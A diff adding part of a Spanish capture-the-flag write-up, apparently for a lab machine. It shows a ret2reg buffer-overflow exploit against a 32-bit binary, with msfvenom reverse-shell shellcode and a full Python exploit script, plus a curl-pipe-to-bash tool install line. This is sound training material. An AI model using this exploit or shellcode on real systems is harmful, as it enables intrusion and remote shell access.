@@ -283,31 +283,99 @@ bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
 - Como están cambiando los números esto quiere decir que el **ASLR** está **HABILITADO**
 	- Como los números son cortos vemos que estamos en **máquina de 32 bits** (haciendo un `file agent` tamb podes ver que el binario es de 32-bit)
 
+![image](https://github.com/user-attachments/assets/bde4e6d1-fa6f-4b4b-aff5-eb26af77589a)
 
+- Bien ahora lo que vamos a averiguar es cuentas ``A`` hay que meter hasta llegar a sobrescribir este registro "**EIP**" (offset llamado a veces)
+	- Hay un utilidad en peda que es esta `pattern create` **---->** Lo que hacemos es crear un cadena aleatorias para después jugar con **pattern offset**
 
+![image](https://github.com/user-attachments/assets/db4aaccc-e0e2-42f0-a215-9bb671334bc7)
 
+- Nos lo copiamos toda esa cadena de caracteres y ejecutamos el binario y lo pegamos y al darle ale **Enter** vemos que el `$eip` vale **raab**
 
+![image](https://github.com/user-attachments/assets/7f193195-9009-428a-bcaa-095446d842ee)
 
+- Entonces si ahora hacemos un `pettern offset $eip` nos dice que son **168 caracteres** para luego sobrescribir el EIP
 
+![image](https://github.com/user-attachments/assets/a3af57c7-751e-4225-8834-4dda2e39cbf6)
 
+- Ahora vemos si haciendo que *nos imprima 168 A* y como *Últimos 4 bytes la B*  -----> vemos si **nos retorna BBBB y 0x42424242** que es la B en hexadecimal
 
+![image](https://github.com/user-attachments/assets/073d4f8b-4d99-4d3d-88ec-644ffb4bb8f0)
+![image](https://github.com/user-attachments/assets/76e6cc6b-3f07-42b2-b1d9-03036547e1db)
 
+# Ret2reg
 
+- Una ves *sobrescribimos* el registro **EIP** toda las demás cadena que pongamos van a estar en el *comienzo* del **ESP** 
+	- Si vemos **EAX** vale AAAA... , entonces si filtramos por `x/16wx $eax` están las Aes pero si retrocedemos *cuatro para atrás* ya no es el mismo valor, entonces podemos pensar que el *comienzo* del *payload* corresponde al registro **$eax**
 
+![image](https://github.com/user-attachments/assets/c92f5365-3a6c-4849-8647-e60830ac3680)
 
+## Msfvenom
 
+- Vamos a crear el ``shellcode`` para que me entable una Reverse Shell 
+	- ``-b``  --> es de Bad Chars, para que nos cree un shellcode sin esos caracteres
+   	- ``shell_reverse_tcp`` porque queremos conectarnos por netcat
 
+![image](https://github.com/user-attachments/assets/370a206b-97b3-4d87-b98a-9a3f74ad2162)
 
+- Bien ahora nos vamos a crear un **script.py** en la máquina víctima en  ``/tmp`` en donde pegamos nuestro shellcode 
+	- Ahora vamos a nuestra máquina y ponemos el siguiente comando para buscar el `call eax` que lo que nos va a buscar es el **Opeartion Code**
 
+![image](https://github.com/user-attachments/assets/94e58b1c-94d9-44d5-831b-9961456536fc)
 
+- Una ves obtenido, jugamos con `objdump` y filtramos por esa cadena `FF D0`
+	- Tenemos una **dirección** en el binario en el que podemos apuntar para  ir por ahí 
 
+![image](https://github.com/user-attachments/assets/d089ec79-11f2-4fe6-881e-3f3905c1bc35)
 
+- Lo que vamos a hacer ahora es que  la **EIP** apunta a esa dirección porque nosotros podemos controlarlo, ya que en esa dirección se aplica un `call eax` por ende el flujo del programa **va a el registro $eax** que comenzaría con el flujo del ``shellcode`` que creamos con ``msfvenom``
+	- Por ende ahora nuestro **script.py** quedaría de esta forma:
 
+```python
+#!/usr/bin/python3
 
+import socket
 
+offset = 168
 
+#Shellcode
+buf =  b""
+buf += b"\xba\x78\x35\x3e\xca\xdb\xd4\xd9\x74\x24\xf4\x5d"
+buf += b"\x33\xc9\xb1\x12\x31\x55\x12\x83\xed\xfc\x03\x2d"
+buf += b"\x3b\xdc\x3f\xfc\x98\xd7\x23\xad\x5d\x4b\xce\x53"
+buf += b"\xeb\x8a\xbe\x35\x26\xcc\x2c\xe0\x08\xf2\x9f\x92"
+buf += b"\x20\x74\xd9\xfa\x72\x2e\x19\x66\x1a\x2d\x1a\x97"
+buf += b"\x60\xb8\xfb\x27\xf0\xeb\xaa\x14\x4e\x08\xc4\x7b"
+buf += b"\x7d\x8f\x84\x13\x10\xbf\x5b\x8b\x84\x90\xb4\x29"
+buf += b"\x3c\x66\x29\xff\xed\xf1\x4f\x4f\x1a\xcf\x10"
 
+#Lo que nos falta para sobreescribir el EIP ya que el shellcode es de 95 bytes entonces seria (168-95)
+buf += b"A"*(offset-len(buf))
 
+#little endian
+buf += b"\x63\x85\x04\x08\n"  # 8048563 -> jmp EAX
+
+#Establecer Conexion TCP
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('127.0.0.1', 7788))
+
+#Enviar la cadena
+s.send(b"48093572\n")  # barra n-> seria un ENTER
+data = s.recv(1024)
+
+s.send(b"3\n")
+data = s.recv(1024)
+
+s.send(buf)  #Por ultimo enviamos nuestro shellcode
+```
+   
+- Estamos **dentro** de la máquina víctima!
+
+![image](https://github.com/user-attachments/assets/a05f6182-ec0b-4cf8-ad0c-5adfa1a104d5)
+
+- Para terminar obtuvimos la la **última flag** de ``ROOT``
+
+![image](https://github.com/user-attachments/assets/69711e06-a5c2-4c39-b0ae-97b0ac16c386)
 
 
 
